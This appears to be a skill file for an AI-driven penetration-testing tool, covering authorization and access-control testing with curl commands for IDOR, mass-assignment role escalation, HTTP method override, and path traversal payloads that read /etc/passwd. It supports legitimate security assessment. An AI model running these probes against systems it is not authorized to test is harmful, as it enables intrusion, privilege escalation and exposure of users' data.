# Authorization & Access Control Testing

## When Invoked

The user runs `/vapt authz <url>` or this skill is triggered as part of Wave 3 during `/vapt audit`.

## Prerequisites

This is the most manual testing category. It requires understanding the application's roles and resources. Check for existing context:
- If `VAPT-WAVE2-CONTEXT.md` exists -> use discovered endpoints
- If `VAPT-AUTH.md` exists -> use authentication details and session tokens
- If no context -> discover endpoints and attempt to identify role-based differences

## Phase 1: Access Control Mapping

### 1.1 Identify Roles

Determine the application's role hierarchy:
- Unauthenticated (anonymous)
- Authenticated (regular user)
- Privileged (admin, moderator, manager)
- Super admin / system

### 1.2 Endpoint Inventory

Build a matrix of endpoints vs roles:
- Which endpoints require authentication?
- Which endpoints are role-restricted?
- Which endpoints handle user-specific data?

```bash
# Check endpoint access as unauthenticated
curl -s -o /dev/null -w "%{http_code}" <url>/admin
curl -s -o /dev/null -w "%{http_code}" <url>/api/users
curl -s -o /dev/null -w "%{http_code}" <url>/dashboard

# Check with regular user token
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer <token>" <url>/admin
```

## Phase 2: Horizontal Privilege Escalation (IDOR)

### 2.1 Direct Object Reference Testing

For endpoints that reference user-specific data (user IDs, order IDs, file names):

1. Identify the reference pattern (numeric ID, UUID, slug)
2. Access the resource as the authenticated user
3. Modify the reference to another user's resource
4. Check if access is granted

```bash
# If user 123 can access their own profile:
curl -s -H "Authorization: Bearer <user_123_token>" <url>/api/users/123

# Try accessing user 124's profile:
curl -s -H "Authorization: Bearer <user_123_token>" <url>/api/users/124
```

Test across:
- User profiles (`/api/users/{id}`)
- Orders/transactions (`/api/orders/{id}`)
- Documents/files (`/api/documents/{id}`)
- Messages (`/api/messages/{id}`)
- Settings (`/api/settings/{user_id}`)

### 2.2 ID Enumeration Patterns

| ID Type | Enumeration Risk |
|---------|-----------------|
| Sequential integers (1, 2, 3...) | High -- trivially enumerable |
| Short numeric IDs | High -- brute forceable |
| UUIDs v4 | Low -- random, hard to guess |
| Base64-encoded IDs | Medium -- decode and modify |
| Hashed IDs | Medium -- may be predictable |

### 2.3 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| IDOR exposing PII | High | 7.5 |
| IDOR modifying other user's data | High | 8.1 |
| IDOR deleting other user's data | High | 8.6 |
| IDOR on non-sensitive data | Medium | 4.3 |

## Phase 3: Vertical Privilege Escalation

### 3.1 Admin Function Access

Test if regular users can access admin-only endpoints:

```bash
# With regular user token, try admin endpoints
curl -s -H "Authorization: Bearer <regular_token>" <url>/admin/users
curl -s -H "Authorization: Bearer <regular_token>" <url>/api/admin/settings
curl -s -H "Authorization: Bearer <regular_token>" <url>/api/admin/export
```

### 3.2 Role Manipulation

Check if the role can be modified in:
- User profile update requests (mass assignment)
- JWT claims (if JWT is used)
- Cookie values
- Hidden form fields

```bash
# Try to elevate role via mass assignment
curl -s -X PUT -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"name":"test","role":"admin"}' \
    <url>/api/users/profile
```

### 3.3 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| Regular user -> admin access | Critical | 9.1 |
| Role escalation via mass assignment | Critical | 9.1 |
| Partial admin function access | High | 7.5 |

## Phase 4: Forced Browsing & Authentication Bypass

### 4.1 Unauthenticated Access

Test if protected pages are accessible without authentication:

```bash
# No auth header -- should all return 401/403
curl -s -o /dev/null -w "%{http_code}" <url>/dashboard
curl -s -o /dev/null -w "%{http_code}" <url>/api/users
curl -s -o /dev/null -w "%{http_code}" <url>/admin
curl -s -o /dev/null -w "%{http_code}" <url>/settings
```

### 4.2 Direct URL Access

Check if pages behind multi-step flows are directly accessible:
- Payment confirmation page without going through checkout
- Step 3 of a wizard without completing steps 1-2
- Admin setup page after initial setup

### 4.3 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| Admin panel accessible without auth | Critical | 9.8 |
| User data accessible without auth | High | 7.5 |
| Non-sensitive page accessible without auth | Low | 3.5 |

## Phase 5: HTTP Method Tampering

### 5.1 Method Override

Some frameworks support method override headers:

```bash
# If POST is blocked, try overriding
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" <url>/api/resource/123
curl -s -X POST -H "X-Method-Override: PUT" <url>/api/resource/123

# Try different HTTP methods
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
    echo "$method: $(curl -s -o /dev/null -w '%{http_code}' -X $method <url>/api/resource/123)"
done
```

### 5.2 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| DELETE allowed via method override | High | 7.5 |
| PUT access where only GET intended | Medium | 5.3 |

## Phase 6: Path Traversal

### 6.1 Directory Traversal

Test parameters that accept file paths:

```bash
# Basic traversal
curl -s "<url>/api/files?path=../../../etc/passwd"
curl -s "<url>/api/files?path=....//....//....//etc/passwd"

# Encoded variants
curl -s "<url>/api/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -s "<url>/api/files?path=..%252f..%252f..%252fetc%252fpasswd"
```

### 6.2 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| Path traversal reading system files | High | 7.5 |
| Path traversal reading app config | High | 8.1 |
| Path traversal limited to app directory | Medium | 5.3 |

## Phase 7: File Upload Access Control

### 7.1 Upload Restrictions

If file upload exists, test:
- File type validation (bypass with double extension, null byte, content-type manipulation)
- File size limits
- Upload path accessibility (can uploaded files be directly accessed?)
- Execution prevention (can uploaded scripts be executed?)

### 7.2 Scoring

| Finding | Severity | CVSS |
|---------|----------|------|
| Unrestricted file upload with execution | Critical | 9.8 |
| File type bypass (no execution) | Medium | 5.3 |
| Upload path publicly accessible | Medium | 4.5 |

## Phase 8: Output

### Terminal Output

**Dev mode:** Explain each access control flaw, the difference between horizontal and vertical escalation, OWASP access control best practices.

**Pro mode:** Access control matrix and findings table.

### VAPT-AUTHZ.md

```markdown
# VAPT Authorization & Access Control Report

## Target: <url>
## Date: <timestamp>

## Role Matrix
| Endpoint | Unauth | User | Admin | Expected |
|----------|--------|------|-------|----------|
| /admin | ... | ... | ... | Admin only |
| /api/users/{id} | ... | ... | ... | Own data only |
| ... | ... | ... | ... | ... |

## IDOR Findings
<horizontal privilege escalation results>

## Vertical Escalation Findings
<privilege escalation results>

## Forced Browsing
<unauthenticated access results>

## HTTP Method Tampering
<method override results>

## Path Traversal
<traversal results>

## File Upload
<upload restriction results>

## Findings
<scored findings table>

## Suggested Next Steps
- /vapt logic <url> -- test business logic around access controls
- /vapt api <url> -- test API-specific access controls
- /vapt report <url> -- compile full report
```

## Cross-Skill Integration

- Authorization findings weight 12% in Security Posture Score
- IDOR findings inform vapt-logic testing
- Access control gaps combined with injection findings amplify risk ratings
